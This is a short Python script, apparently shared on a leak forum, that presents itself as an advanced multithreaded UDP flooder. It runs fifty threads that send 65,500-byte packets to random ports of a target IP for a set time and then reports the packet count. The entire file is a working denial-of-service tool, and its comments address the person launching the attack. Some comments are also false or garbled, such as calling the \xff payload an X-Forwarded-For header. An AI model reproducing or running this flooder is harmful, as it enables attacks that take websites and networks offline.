
#!/usr/bin/python
#	Advanced Multithreaded UDP Flooder coded by Fl0urite
#	leak.sx
#	Hope u leik!


# imports from necessary packages
import os
import sys
import time
import socket
import random
from threading import Thread

#The IP of the website you wish to deed Dos
#Which can be found by performing a tracert(on windows )
ip='192.168.137.18'

#How many threads of your computer you want to dedicate to this task
threads=50

#how long you want the attact to lasts
endtime=60

#The function that will be run across all the threads
def udp(ip,port,floodtime):
	#varibles for used by all thereds
	global packets
	global threads
	global endtime
	#counter
	packets=0

	#data being sent to target
	#\xff is a X-Forwarded-For headed not normal classed as bad by filteing programs
	data=(b"\xFF")*65500
	#makes a socket object and send the data for the set time limt
	while floodtime>=time.clock():
		s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
		randport=random.randrange(1,65500)
		s.sendto(data,(ip,randport))

		packets+=1
	#Here to let you know if a thread stops work running
	print ("Thread "+str(threads)+" Stopping...")

	threads-=1


#Creates all the multiple thread objects and starts them
port=0
for i in range(0,threads):
	t=Thread(target=(udp),args=(ip,port,endtime))
	t.start()
time.sleep(endtime)

#A function that waits for all threads to be completed before executing the main application
while threads>=1:
	print ("Waiting for "+str(threads)+" threads to finish...")
	time.sleep(1)
#An output of the  results of your attack
print("Sent "+str(packets)+" packets, averaging at ~"+str(packets/16/endtime)+" MB/s!")
exit()
